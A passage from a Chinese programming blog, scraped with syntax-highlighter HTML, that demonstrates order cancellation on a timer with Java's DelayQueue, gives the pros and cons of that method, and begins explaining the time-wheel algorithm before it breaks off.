class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">convert</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">NANOSECONDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"编号的订单要删除啦。。。。\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-33\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>运行的测试Demo为，我们设定延迟时间为3秒</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358b0575696976\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay2;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.concurrent.DelayQueue;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class DelayQueueDemo {\r\n     public static void main(String[] args) {  \r\n            // TODO Auto-generated method stub  \r\n            List&lt;String&gt; list = new ArrayList&lt;String&gt;();  \r\n            list.add(\"00000001\");  \r\n            list.add(\"00000002\");  \r\n            list.add(\"00000003\");  \r\n            list.add(\"00000004\");  \r\n            list.add(\"00000005\");  \r\n            DelayQueue&lt;OrderDelay&gt; queue = new DelayQueue&lt;OrderDelay&gt;();  \r\n            long start = System.currentTimeMillis();  \r\n            for(int i = 0;i&lt;5;i++){  \r\n                //延迟三秒取出\r\n                queue.put(new OrderDelay(list.get(i),  \r\n                        TimeUnit.NANOSECONDS.convert(3, TimeUnit.SECONDS)));  \r\n                    try {  \r\n                         queue.take().print();  \r\n                         System.out.println(\"After \" +   \r\n                                 (System.currentTimeMillis()-start) + \" MilliSeconds\");  \r\n                } catch (InterruptedException e) {  \r\n                    // TODO Auto-generated catch block  \r\n                    e.printStackTrace();  \r\n                }  \r\n            }  \r\n        }  \r\n    \r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b0575696976-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b0575696976-34\">34</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">List</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">DelayQueue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-8\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DelayQueueDemo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-9\"><span class=\"crayon-h\">     </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// TODO Auto-generated method stub  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">List</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"00000001\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"00000002\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"00000003\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"00000004\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"00000005\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">DelayQueue</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">OrderDelay</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">queue</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DelayQueue</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">OrderDelay</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-19\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-20\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">//延迟三秒取出</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-21\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">queue</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">OrderDelay</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-22\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">NANOSECONDS</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">convert</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SECONDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-23\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-24\"><span class=\"crayon-h\">                         </span><span class=\"crayon-v\">queue</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">take</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-25\"><span class=\"crayon-h\">                         </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"After \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-26\"><span class=\"crayon-h\">                                 </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">start</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" MilliSeconds\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-27\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">InterruptedException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-28\"><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// TODO Auto-generated catch block  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-29\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-30\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-31\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-32\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b0575696976-33\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b0575696976-34\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0061 seconds] -->\r\n<p>输出如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358b4897940516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n00000001编号的订单要删除啦。。。。\r\nAfter 3003 MilliSeconds\r\n00000002编号的订单要删除啦。。。。\r\nAfter 6006 MilliSeconds\r\n00000003编号的订单要删除啦。。。。\r\nAfter 9006 MilliSeconds\r\n00000004编号的订单要删除啦。。。。\r\nAfter 12008 MilliSeconds\r\n00000005编号的订单要删除啦。。。。\r\nAfter 15009 MilliSeconds</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b4897940516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b4897940516-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b4897940516-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b4897940516-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b4897940516-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b4897940516-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b4897940516-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b4897940516-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b4897940516-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b4897940516-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358b4897940516-1\"><span class=\"crayon-cn\">00000001</span>编号的订单要删除啦。。。。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b4897940516-2\"><span class=\"crayon-i\">After</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3003</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">MilliSeconds</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b4897940516-3\"><span class=\"crayon-cn\">00000002</span>编号的订单要删除啦。。。。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b4897940516-4\"><span class=\"crayon-i\">After</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6006</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">MilliSeconds</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b4897940516-5\"><span class=\"crayon-cn\">00000003</span>编号的订单要删除啦。。。。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b4897940516-6\"><span class=\"crayon-i\">After</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9006</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">MilliSeconds</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b4897940516-7\"><span class=\"crayon-cn\">00000004</span>编号的订单要删除啦。。。。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b4897940516-8\"><span class=\"crayon-i\">After</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12008</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">MilliSeconds</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b4897940516-9\"><span class=\"crayon-cn\">00000005</span>编号的订单要删除啦。。。。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b4897940516-10\"><span class=\"crayon-i\">After</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15009</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MilliSeconds</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>可以看到都是延迟3秒，订单被删除</p>\n<h4 id=\"优缺点-1\">优缺点</h4>\n<p>优点:效率高,任务触发时间延迟低。<br>\n缺点:(1)服务器重启后，数据全部消失，怕宕机<br>\n(2)集群扩展相当麻烦<br>\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常<br>\n(4)代码复杂度较高</p>\n<h3 id=\"时间轮算法\">(3)时间轮算法</h3>\n<h4 id=\"思路-2\">思路</h4>\n<p>先上一张时间轮的图(这图到处都是啦)</p>\n<div><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/30e7eb6723639e8dc9f412c523c70402.png\"></div>\n<p>时间轮算法可以类比于时钟，如上图箭头（指针）按某一个方向按固定频率轮动，每一次跳动称为一个 tick。这样可以看出定时轮由个3个重要的属性参数，ticksPerWheel（一轮的tick数），tickDuration（一个tick的持续时间）以及 timeUnit（时间单位），例如当ticksPerWheel=60，tickDuration=1，timeUnit=秒，这就和现实中的始终的秒针走动完全类似了。</p>\n<p>如果当前指针指在1上面，我有一个任务需要4秒以后执行，那么这个执行的线程回调或者消息将会被放在5上。那如果需要在20秒之后执行怎么办，由于这个环形结构槽数只到8，如果要20秒，指针需要多转2圈。位置是在2圈之后的5上面（20 % 8 + 1）</p>\n<h4 